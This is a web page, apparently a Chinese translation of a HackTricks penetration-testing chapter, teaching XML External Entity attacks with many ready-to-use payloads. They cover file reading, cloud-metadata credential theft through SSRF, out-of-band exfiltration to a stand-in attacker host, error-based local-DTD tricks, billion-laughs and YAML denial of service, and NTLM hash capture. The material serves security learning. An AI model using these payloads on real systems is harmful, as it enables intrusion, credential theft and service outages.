<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>XXE - XEE - XML External Entity</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="xxe---xee---xml-external-entity"><a class="header" href="#xxe---xee---xml-external-entity">XXE - XEE - XML External Entity</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="xml-基础"><a class="header" href="#xml-基础">XML 基础</a></h2>
<p>XML 是一种用于数据存储和传输的标记语言，具有灵活的结构，允许使用描述性命名的标签。它与 HTML 的不同之处在于不受限于一组预定义标签。尽管 XML 在 AJAX 技术中的初始作用显著，但随着 JSON 的兴起，其重要性已下降。</p>
<ul>
<li><strong>通过实体表示数据</strong>：XML 中的实体使得数据的表示成为可能，包括特殊字符如 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>，它们分别对应于 <code>&lt;</code> 和 <code>&gt;</code>，以避免与 XML 的标签系统发生冲突。</li>
<li><strong>定义 XML 元素</strong>：XML 允许定义元素类型，概述元素应如何结构化以及可以包含哪些内容，从任何类型的内容到特定的子元素。</li>
<li><strong>文档类型定义 (DTD)</strong>：DTD 在 XML 中对于定义文档的结构和可以包含的数据类型至关重要。它们可以是内部的、外部的或两者的组合，指导文档的格式和验证方式。</li>
<li><strong>自定义和外部实体</strong>：XML 支持在 DTD 中创建自定义实体，以实现灵活的数据表示。外部实体通过 URL 定义，带来了安全隐患，特别是在 XML 外部实体 (XXE) 攻击的背景下，这些攻击利用了 XML 解析器处理外部数据源的方式：<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity "value" &gt; ]&gt;</code></li>
<li><strong>使用参数实体检测 XXE</strong>：为了检测 XXE 漏洞，特别是在常规方法因解析器安全措施而失败时，可以利用 XML 参数实体。这些实体允许使用带外检测技术，例如触发 DNS 查找或向受控域发出 HTTP 请求，以确认漏洞。</li>
<li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "file:///etc/passwd" &gt; ]&gt;</code></li>
<li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "http://attacker.com" &gt; ]&gt;</code></li>
</ul>
<h2 id="主要攻击"><a class="header" href="#主要攻击">主要攻击</a></h2>
<p><a href="https://portswigger.net/web-security/xxe"><strong>这些攻击大多是在出色的 Portswiggers XEE 实验室中测试的：https://portswigger.net/web-security/xxe</strong></a></p>
<h3 id="新实体测试"><a class="header" href="#新实体测试">新实体测试</a></h3>
<p>在此攻击中，我将测试一个简单的新 ENTITY 声明是否有效。</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY toreplace "3"&gt; ]&gt;
&lt;stockCheck&gt;
&lt;productId&gt;&amp;toreplace;&lt;/productId&gt;
&lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(870).png" alt="" /></p>
<h3 id="读取文件"><a class="header" href="#读取文件">读取文件</a></h3>
<p>让我们尝试以不同的方式读取 <code>/etc/passwd</code>。对于 Windows，你可以尝试读取: <code>C:\windows\system32\drivers\etc\hosts</code></p>
<p>在这种情况下，请注意 SYSTEM "<em>**file:///**etc/passwd</em>" 也会有效。</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM "/etc/passwd"&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(86).png" alt="" /></p>
<p>这个第二个案例应该有助于提取文件，如果web服务器使用PHP（Portswiggers实验室的情况除外）</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>在这个第三个案例中，请注意我们将 <code>Element stockCheck</code> 声明为 ANY</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT stockCheck ANY&gt;
&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;stockCheck&gt;
&lt;productId&gt;&amp;file;&lt;/productId&gt;
&lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck3&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(753).png" alt="" /></p>
<h3 id="目录列表"><a class="header" href="#目录列表">目录列表</a></h3>
<p>在<strong>Java</strong>基础的应用程序中，可能通过XXE使用类似的有效负载<strong>列出目录的内容</strong>（只请求目录而不是文件）：</p>
<pre><code class="language-xml">&lt;!-- Root / --&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///"&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;

&lt;!-- /etc/ --&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM "file:///etc/" &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;
</code></pre>
<h3 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h3>
<p>XXE 可以被用来滥用云中的 SSRF</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<h3 id="blind-ssrf"><a class="header" href="#blind-ssrf">Blind SSRF</a></h3>
<p>使用<strong>之前提到的技术</strong>，您可以让服务器访问您控制的服务器，以显示其存在漏洞。但是，如果这不起作用，可能是因为<strong>不允许使用XML实体</strong>，在这种情况下，您可以尝试使用<strong>XML参数实体</strong>：</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<h3 id="盲-ssrf---通过带外方式提取数据"><a class="header" href="#盲-ssrf---通过带外方式提取数据">"盲" SSRF - 通过带外方式提取数据</a></h3>
<p><strong>在这种情况下，我们将使服务器加载一个带有恶意负载的新 DTD，该负载将通过 HTTP 请求发送文件的内容（对于多行文件，您可以尝试通过 _ftp://</strong>_ 来提取它，例如使用这个基本服务器 <a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb"><strong>xxe-ftp-server.rb</strong></a><strong>）。这个解释基于</strong> <a href="https://portswigger.net/web-security/xxe/blind"><strong>Portswiggers 实验室</strong></a><strong>。</strong></p>
<p>在给定的恶意 DTD 中，执行了一系列步骤以提取数据：</p>
<h3 id="恶意-dtd-示例"><a class="header" href="#恶意-dtd-示例">恶意 DTD 示例：</a></h3>
<p>结构如下：</p>
<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;
</code></pre>
<p>The steps executed by this DTD include:</p>
<ol>
<li><strong>参数实体的定义：</strong></li>
</ol>
<ul>
<li>创建一个 XML 参数实体 <code>%file</code>，读取 <code>/etc/hostname</code> 文件的内容。</li>
<li>定义另一个 XML 参数实体 <code>%eval</code>。它动态声明一个新的 XML 参数实体 <code>%exfiltrate</code>。<code>%exfiltrate</code> 实体被设置为向攻击者的服务器发起 HTTP 请求，将 <code>%file</code> 实体的内容作为 URL 查询字符串的一部分传递。</li>
</ul>
<ol start="2">
<li><strong>实体的执行：</strong></li>
</ol>
<ul>
<li>使用 <code>%eval</code> 实体，导致动态声明 <code>%exfiltrate</code> 实体的执行。</li>
<li>然后使用 <code>%exfiltrate</code> 实体，触发对指定 URL 的 HTTP 请求，包含文件的内容。</li>
</ul>
<p>攻击者将这个恶意 DTD 托管在他们控制的服务器上，通常在类似 <code>http://web-attacker.com/malicious.dtd</code> 的 URL 下。</p>
<p><strong>XXE Payload:</strong> To exploit a vulnerable application, the attacker sends an XXE payload:</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>这个有效负载定义了一个 XML 参数实体 <code>%xxe</code> 并将其纳入 DTD。当被 XML 解析器处理时，这个有效负载从攻击者的服务器获取外部 DTD。然后解析器内联解释 DTD，执行恶意 DTD 中概述的步骤，导致 <code>/etc/hostname</code> 文件被外泄到攻击者的服务器。</p>
<h3 id="基于错误外部-dtd"><a class="header" href="#基于错误外部-dtd">基于错误（外部 DTD）</a></h3>
<p><strong>在这种情况下，我们将使服务器加载一个恶意 DTD，该 DTD 将在错误消息中显示文件的内容（仅在您可以看到错误消息时有效）。</strong> <a href="https://portswigger.net/web-security/xxe/blind"><strong>示例来自这里。</strong></a></p>
<p>可以通过使用恶意外部文档类型定义（DTD）触发一个 XML 解析错误消息，揭示 <code>/etc/passwd</code> 文件的内容。这是通过以下步骤完成的：</p>
<ol>
<li>定义一个名为 <code>file</code> 的 XML 参数实体，其中包含 <code>/etc/passwd</code> 文件的内容。</li>
<li>定义一个名为 <code>eval</code> 的 XML 参数实体，包含对另一个 XML 参数实体 <code>error</code> 的动态声明。当评估时，这个 <code>error</code> 实体尝试加载一个不存在的文件，将 <code>file</code> 实体的内容作为其名称。</li>
<li>调用 <code>eval</code> 实体，导致 <code>error</code> 实体的动态声明。</li>
<li>调用 <code>error</code> 实体导致尝试加载一个不存在的文件，产生一个错误消息，其中包含 <code>/etc/passwd</code> 文件的内容作为文件名的一部分。</li>
</ol>
<p>可以使用以下 XML 调用恶意外部 DTD：</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p>在执行时，web 服务器的响应应包含一个错误消息，显示 <code>/etc/passwd</code> 文件的内容。</p>
<p><img src="../.gitbook/assets/image%20(809).png" alt="" /></p>
<p><em><strong>请注意，外部 DTD 允许我们在第二个实体内部包含一个实体（<strong><strong><code>eval</code></strong></strong>），但在内部 DTD 中是禁止的。因此，通常情况下，您无法强制产生错误而不使用外部 DTD。</strong></em></p>
<h3 id="基于错误系统-dtd"><a class="header" href="#基于错误系统-dtd"><strong>基于错误（系统 DTD）</strong></a></h3>
<p>那么，当 <strong>出带外交互被阻止</strong>（外部连接不可用）时，盲 XXE 漏洞怎么办？</p>
<p>XML 语言规范中的一个漏洞可以 <strong>通过错误消息暴露敏感数据，当文档的 DTD 混合内部和外部声明时</strong>。这个问题允许从内部 DTD 中重新定义外部声明的实体，从而促进基于错误的 XXE 攻击的执行。这种攻击利用了一个 XML 参数实体的重新定义，该实体最初在外部 DTD 中声明，从内部 DTD 中进行重新定义。当服务器阻止出带外连接时，攻击者必须依赖本地 DTD 文件进行攻击，旨在诱发解析错误以揭示敏感信息。</p>
<p>考虑一个场景，服务器的文件系统中包含一个位于 <code>/usr/local/app/schema.dtd</code> 的 DTD 文件，定义了一个名为 <code>custom_entity</code> 的实体。攻击者可以通过提交一个混合 DTD 来诱发 XML 解析错误，从而揭示 <code>/etc/passwd</code> 文件的内容，如下所示：</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;
&lt;!ENTITY % custom_entity '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;
</code></pre>
<p>The outlined steps are executed by this DTD:</p>
<ul>
<li>XML参数实体<code>local_dtd</code>的定义包括位于服务器文件系统上的外部DTD文件。</li>
<li>对<code>custom_entity</code> XML参数实体进行重新定义，该实体最初在外部DTD中定义，以封装一个<a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">基于错误的XXE漏洞</a>。此重新定义旨在引发解析错误，暴露<code>/etc/passwd</code>文件的内容。</li>
<li>通过使用<code>local_dtd</code>实体，外部DTD被调用，包含新定义的<code>custom_entity</code>。这一系列操作导致了漏洞所针对的错误消息的发出。</li>
</ul>
<p><strong>Real world example:</strong> 使用GNOME桌面环境的系统通常在<code>/usr/share/yelp/dtd/docbookx.dtd</code>中有一个DTD，其中包含一个名为<code>ISOamso</code>的实体。</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
&lt;!ENTITY % ISOamso '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(625).png" alt="" /></p>
<p>由于此技术使用<strong>内部 DTD，您需要先找到一个有效的 DTD</strong>。您可以通过<strong>安装</strong>服务器正在使用的相同<strong>操作系统/软件</strong>并<strong>搜索一些默认 DTD</strong>，或者<strong>获取系统内的默认 DTD 列表</strong>并<strong>检查</strong>它们是否存在：</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
%local_dtd;
]&gt;
</code></pre>
<p>有关更多信息，请查看 <a href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a></p>
<h3 id="在系统中查找-dtd"><a class="header" href="#在系统中查找-dtd">在系统中查找 DTD</a></h3>
<p>在以下精彩的 GitHub 仓库中，您可以找到 <strong>可能存在于系统中的 DTD 路径</strong>：</p>
<p>{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}</p>
<p>此外，如果您拥有 <strong>受害者系统的 Docker 镜像</strong>，您可以使用同一仓库的工具来 <strong>扫描</strong> <strong>镜像</strong> 并 <strong>查找</strong> 系统中存在的 <strong>DTD 路径</strong>。请阅读 <a href="https://github.com/GoSecure/dtd-finder">GitHub 的自述文件</a> 以了解如何操作。</p>
<pre><code class="language-bash">java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
</code></pre>
<h3 id="xxe-via-office-open-xml-parsers"><a class="header" href="#xxe-via-office-open-xml-parsers">XXE via Office Open XML Parsers</a></h3>
<p>要更深入地了解此攻击，<strong>请查看</strong> <a href="https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/"><strong>这篇精彩的文章</strong></a> <strong>来自 Detectify 的第二部分</strong>。</p>
<p>许多网络应用程序提供<strong>上传 Microsoft Office 文档的功能</strong>，然后提取这些文档中的某些细节。例如，网络应用程序可能允许用户通过上传 XLSX 格式的电子表格来导入数据。为了让解析器从电子表格中提取数据，它不可避免地需要解析至少一个 XML 文件。</p>
<p>要测试此漏洞，需要创建一个<strong>包含 XXE 有效负载的 Microsoft Office 文件</strong>。第一步是创建一个空目录，以便将文档解压缩到其中。</p>
<p>文档解压缩后，应在首选文本编辑器（如 vim）中打开并编辑位于 <code>./unzipped/word/document.xml</code> 的 XML 文件。应修改 XML 以包含所需的 XXE 有效负载，通常以 HTTP 请求开头。</p>
<p>修改后的 XML 行应插入到两个根 XML 对象之间。重要的是将 URL 替换为可监控请求的 URL。</p>
<p>最后，可以将文件压缩以创建恶意的 poc.docx 文件。从之前创建的“unzipped”目录中，应运行以下命令：</p>
<p>现在，可以将创建的文件上传到潜在的易受攻击的网络应用程序，并希望在 Burp Collaborator 日志中出现请求。</p>
<h3 id="jar-protocol"><a class="header" href="#jar-protocol">Jar: protocol</a></h3>
<p><strong>jar</strong> 协议仅在 <strong>Java 应用程序</strong> 中可用。它旨在启用对 <strong>PKZIP</strong> 存档（例如，<code>.zip</code>、<code>.jar</code> 等）中的文件访问，适用于本地和远程文件。</p>
<pre><code>jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
</code></pre>
<p>{% hint style="danger" %}
能够访问PKZIP文件中的文件对<strong>利用系统DTD文件进行XXE攻击非常有用。</strong> 查看<a href="xxe-xee-xml-external-entity.html#error-based-system-dtd">本节以了解如何利用系统DTD文件</a>。
{% endhint %}</p>
<p>通过jar协议访问PKZIP归档文件中的文件的过程涉及几个步骤：</p>
<ol>
<li>发出HTTP请求，从指定位置下载zip归档，例如<code>https://download.website.com/archive.zip</code>。</li>
<li>包含归档的HTTP响应临时存储在系统上，通常在<code>/tmp/...</code>这样的地方。</li>
<li>然后提取归档以访问其内容。</li>
<li>读取归档中的特定文件<code>file.zip</code>。</li>
<li>操作完成后，删除在此过程中创建的任何临时文件。</li>
</ol>
<p>在第二步中中断此过程的一个有趣技术是，在提供归档文件时保持服务器连接无限期打开。可以利用<a href="https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution">这个仓库</a>中的工具来实现这一点，包括一个Python服务器(<code>slow_http_server.py</code>)和一个Java服务器(<code>slowserver.jar</code>)。</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd"&gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre>
<p>{% hint style="danger" %}
在临时目录中写入文件可以帮助<strong>升级另一个涉及路径遍历的漏洞</strong>（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。
{% endhint %}</p>
<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
<pre><code class="language-xml">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
</code></pre>
<h3 id="dos"><a class="header" href="#dos">DoS</a></h3>
<h4 id="十亿笑声攻击"><a class="header" href="#十亿笑声攻击">十亿笑声攻击</a></h4>
<pre><code class="language-xml">&lt;!DOCTYPE data [
&lt;!ENTITY a0 "dos" &gt;
&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;
&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;
&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;
&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;/data&gt;
</code></pre>
<h4 id="yaml-攻击"><a class="header" href="#yaml-攻击">Yaml 攻击</a></h4>
<pre><code class="language-xml">a: &amp;a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
</code></pre>
<h4 id="二次爆炸攻击"><a class="header" href="#二次爆炸攻击">二次爆炸攻击</a></h4>
<p><img src="../.gitbook/assets/image%20(527).png" alt="" /></p>
<h4 id="获取-ntml"><a class="header" href="#获取-ntml">获取 NTML</a></h4>
<p>在 Windows 主机上，可以通过设置 responder.py 处理程序来获取 web 服务器用户的 NTML 哈希：</p>
<pre><code class="language-bash">Responder.py -I eth0 -v
</code></pre>
<p>并通过发送以下请求</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>然后你可以尝试使用 hashcat 破解哈希</p>
<h2 id="隐藏的-xxe-表现"><a class="header" href="#隐藏的-xxe-表现">隐藏的 XXE 表现</a></h2>
<h3 id="xinclude"><a class="header" href="#xinclude">XInclude</a></h3>
<p>在将客户端数据集成到服务器端 XML 文档中时，例如后端 SOAP 请求中的文档，通常对 XML 结构的直接控制是有限的，这使得由于对修改 <code>DOCTYPE</code> 元素的限制，传统的 XXE 攻击受到阻碍。然而，<code>XInclude</code> 攻击提供了解决方案，通过允许在 XML 文档的任何数据元素中插入外部实体。即使只能控制服务器生成的 XML 文档中的一部分数据，这种方法也是有效的。</p>
<p>要执行 <code>XInclude</code> 攻击，必须声明 <code>XInclude</code> 命名空间，并指定所需外部实体的文件路径。以下是如何制定此类攻击的简洁示例：</p>
